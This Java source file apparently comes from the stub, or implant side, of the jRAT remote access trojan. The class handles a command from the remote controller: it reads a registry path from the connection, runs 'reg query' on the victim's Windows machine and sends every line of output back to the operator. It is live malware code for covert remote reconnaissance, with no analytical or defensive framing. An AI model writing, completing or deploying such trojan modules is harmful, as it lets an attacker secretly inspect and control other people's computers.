package pro.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import pro.jrat.common.OperatingSystem;
import pro.jrat.stub.Connection;
import pro.jrat.stub.packets.outgoing.Packet54Registry;


public class Packet79BrowseRegistry extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String path = Connection.readLine();
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", path });

				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					String[] args = line.trim().split("    ");
					Connection.addToSendQueue(new Packet54Registry(args));
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			Connection.addToSendQueue(new Packet54Registry(new String[] { "1", "Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage() }));
		}
	}

}
